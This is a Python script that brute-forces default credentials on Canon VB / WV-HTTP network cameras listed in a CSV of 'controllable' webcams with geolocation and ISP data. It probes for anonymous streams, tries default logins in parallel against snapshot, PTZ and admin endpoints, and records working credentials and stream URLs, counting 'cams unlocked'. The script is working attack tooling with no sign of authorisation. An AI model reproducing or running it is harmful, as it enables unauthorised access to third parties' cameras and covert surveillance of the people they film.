"""Canon VB / VBViewer / WV-HTTP brute-forcer.

Uses default creds against Canon VB cams. WV-HTTP errors return 78-byte "Unknown Operator"
response, so we check for size > 78 to detect auth bypass.

Reads from controllable_Webcams_vbviewer.csv, writes auth_user/auth_pass back,
and dumps findings to bruteforce/vbviewer_bf_results.json.
"""

import os
import sys
import json
import csv
import re
import time
import requests
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))) + os.sep + "camera_testing")
from vbviewer_probe import (
    ALL_DEFAULT_CREDS, VBVIEWER_AUTH_PATHS, WVHTTP_INFO_ENDPOINTS,
    probe_vb_cam, try_default_creds, detect_model_vb,
)

WORKDIR = r"C:\Users\eli6-admin\Documents\eli6-surveillance"
CSV_PATH = os.path.join(WORKDIR, "controllable_Webcams_vbviewer.csv")
BF_RESULTS_PATH = os.path.join(WORKDIR, "bruteforce", "vbviewer_bf_results.json")
PROGRESS_PATH = os.path.join(WORKDIR, "bruteforce", "vbviewer_bf_progress.json")

PROBE_TIMEOUT = 8
MAX_WORKERS = 12


def load_progress():
    if os.path.exists(PROGRESS_PATH):
        try:
            with open(PROGRESS_PATH, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            pass
    return {"urls_tested": [], "cams_unlocked": 0}


def save_progress(progress):
    try:
        os.makedirs(os.path.dirname(PROGRESS_PATH), exist_ok=True)
        with open(PROGRESS_PATH, "w", encoding="utf-8") as f:
            json.dump(progress, f)
    except Exception as e:
        print(f"Save progress error: {e}", file=sys.stderr)


def load_bf_results():
    if os.path.exists(BF_RESULTS_PATH):
        try:
            with open(BF_RESULTS_PATH, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            pass
    return {}


def save_bf_results(results):
    try:
        os.makedirs(os.path.dirname(BF_RESULTS_PATH), exist_ok=True)
        with open(BF_RESULTS_PATH, "w", encoding="utf-8") as f:
            json.dump(results, f, indent=2)
    except Exception as e:
        print(f"Save BF results error: {e}", file=sys.stderr)


def read_csv_rows():
    rows = []
    if not os.path.exists(CSV_PATH):
        return rows
    try:
        csv.field_size_limit(2**31 - 1)
        with open(CSV_PATH, "r", encoding="utf-8", errors="replace", newline="") as f:
            r = csv.reader(f)
            header = next(r, None)
            if not header:
                return rows
            for row in r:
                if len(row) < len(header):
                    row += [""] * (len(header) - len(row))
                rows.append(dict(zip(header, row)))
    except Exception as e:
        print(f"Read CSV error: {e}", file=sys.stderr)
    return rows


def write_csv_rows(rows):
    """Write all rows back to VBViewer CSV (atomic)."""
    try:
        tmp_path = CSV_PATH + ".tmp"
        with open(tmp_path, "w", encoding="utf-8", newline="") as f:
            w = csv.writer(f, lineterminator="\n", quoting=csv.QUOTE_MINIMAL)
            header = list(rows[0].keys()) if rows else [
                "idx", "project_name", "url", "live_stream_url", "type", "auth_required",
                "auth_user", "auth_pass", "enabled", "live_status", "http_status",
                "content_type", "server_header", "page_title", "description", "category",
                "likely_subject", "brand", "model", "country", "region", "city", "zip",
                "address", "lat", "lon", "geo_source", "isp", "org", "asn", "reverse_dns",
                "host", "confidence", "notes", "csv_id"
            ]
            w.writerow(header)
            for r in rows:
                w.writerow([r.get(k, "") for k in header])
        os.replace(tmp_path, CSV_PATH)
    except Exception as e:
        print(f"Write CSV error: {e}", file=sys.stderr)


def try_vb_auth(host, port=80, use_https=False, timeout=5):
    """Try default creds against Canon VB cams. Returns first successful auth."""
    scheme = "https" if use_https else "http"
    base = f"{scheme}://{host}:{port}"
    s = requests.Session()
    s.headers.update({"User-Agent": "Mozilla/5.0"})
    s.verify = False
    s.timeout = timeout

    # Test endpoints that return different content with valid auth
    test_endpoints = [
        ("/-wvhttp-01-/CamCtrl?Mode=Snapshot", "wvhttp"),  # Success = different response size
        ("/-wvhttp-01-/CamCtrl?Mode=HomePosition", "wvhttp"),
        ("/admin/index.html?lang=en", "admin"),
        ("/cgi-bin/aw_cam", "cgi"),
        ("/cgi-bin/aw_ptz?cmd=%23APS&res=1", "cgi"),
    ]

    for path, kind in test_endpoints:
        for user, pw in ALL_DEFAULT_CREDS:
            try:
                r = s.get(base + path, auth=(user, pw), timeout=timeout, allow_redirects=False)
                # Auth success indicators
                success = False
                if kind == "wvhttp":
                    # WV-HTTP returns 78 bytes "Unknown Operator" when no auth needed,
                    # or different size when auth succeeds
                    if r.status_code == 200:
                        if "Unknown Operator" in r.text and len(r.text) <= 100:
                            continue  # Not auth-protected or wrong creds
                        # If response is different from error, it's auth success
                        if "WebView Livescope Http Server Error" not in r.text or len(r.text) > 100:
                            success = True
                elif kind == "admin":
                    if r.status_code == 200 and "401" not in r.text[:200] and "Authorization" not in r.headers.get("WWW-Authenticate", ""):
                        if not re.search(r"<title[^>]*>[^<]*(?:Login|login|Authentication Required)", r.text[:500], re.I):
                            success = True
                elif kind == "cgi":
                    if r.status_code == 200 and "401" not in r.text[:200]:
                        if "WebView Livescope Http Server Error" not in r.text:
                            success = True
                if success:
                    return {
                        "user": user,
                        "pass": pw,
                        "path": path,
                        "kind": kind,
                        "status": r.status_code,
                        "size": len(r.text),
                    }
            except Exception:
                continue
    return None


def bruteforce_vb(row, progress):
    """Main BF logic for a single VB cam row."""
    url = row.get("url", "")
    host = row.get("host", "")
    if not host:
        p = urlparse(url)
        host = p.hostname or ""
    if not host:
        return None

    test_key = f"{host}:{url}"
    if test_key in progress["urls_tested"]:
        return None
    progress["urls_tested"].append(test_key)

    p = urlparse(url)
    port = p.port or 80
    use_https = p.scheme == "https"

    result = {"host": host, "port": port, "url": url, "methods_tried": [], "success": False}

    # Step 1: Probe with new library to find anon streams or auth
    findings = probe_vb_cam(host, port, use_https)
    result["findings"] = {
        "is_vb_cam": findings["is_vb_cam"],
        "anon_streams_count": len(findings["anon_streams"]),
        "version": findings["version"],
        "model": findings["model"],
        "internal_ip": findings["internal_ip"],
        "auth_required_count": len(findings["auth_required"]),
    }

    if findings["anon_streams"]:
        best = findings["anon_streams"][0]
        result["methods_tried"].append({"method": "anon_wvhttp", "result": best})
        result["success"] = True
        result["auth_method"] = "anonymous_wvhttp"
        result["auth_user"] = ""
        result["auth_pass"] = ""
        result["anon_url"] = best["url"]
        return result

    # Step 2: Try default creds
    auth_match = try_vb_auth(host, port, use_https)
    if auth_match:
        result["methods_tried"].append({"method": "default_creds", "result": auth_match})
        result["success"] = True
        result["auth_method"] = "default_creds"
        result["auth_user"] = auth_match["user"]
        result["auth_pass"] = auth_match["pass"]
        return result

    result["auth_method"] = "no_auth_yet"
    return result


def main():
    progress = load_progress()
    bf_results = load_bf_results()
    print(f"[VB BF] Loaded {len(progress['urls_tested'])} previously tested URLs.")
    print(f"[VB BF] Cams unlocked so far: {progress['cams_unlocked']}.")

    rows = read_csv_rows()
    print(f"[VB BF] Loaded {len(rows)} rows from {CSV_PATH}")

    # Process all rows that haven't been BF'd yet
    target_rows = [r for r in rows if r.get("auth_user", "") == "" and r.get("live_status") == "live"]
    print(f"[VB BF] Targeting {len(target_rows)} rows for BF/anonymous probing.")

    unlocked = 0
    new_results = {}
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as ex:
        futures = {ex.submit(bruteforce_vb, r, progress): r for r in target_rows}
        for i, fut in enumerate(as_completed(futures)):
            try:
                result = fut.result(timeout=120)
            except Exception as e:
                result = None
            if result and result.get("success"):
                row = futures[fut]
                bf_key = f"{result['host']}:{result['port']}"
                new_results[bf_key] = result
                row["auth_user"] = result.get("auth_user", "")
                row["auth_pass"] = result.get("auth_pass", "")
                if result.get("anon_url"):
                    row["live_stream_url"] = result["anon_url"]
                if result.get("findings"):
                    f = result["findings"]
                    if f.get("model"):
                        row["model"] = f["model"]
                    if f.get("version"):
                        row["notes"] = (row.get("notes", "") + f" | version={f['version']}").strip(" |")
                unlocked += 1
                progress["cams_unlocked"] = progress.get("cams_unlocked", 0) + 1
                if unlocked % 5 == 0:
                    save_progress(progress)
                    bf_results.update(new_results)
                    save_bf_results(bf_results)
                    print(f"  Unlocked {unlocked} cams so far...")
            if (i + 1) % 25 == 0:
                print(f"  Processed {i+1}/{len(target_rows)} (unlocked={unlocked})")

    save_progress(progress)
    bf_results.update(new_results)
    save_bf_results(bf_results)
    write_csv_rows(rows)
    print(f"\n[VB BF] Done. Unlocked {unlocked} cams.")
    print(f"[VB BF] Total cams unlocked this session: {progress['cams_unlocked']}")


if __name__ == "__main__":
    main()
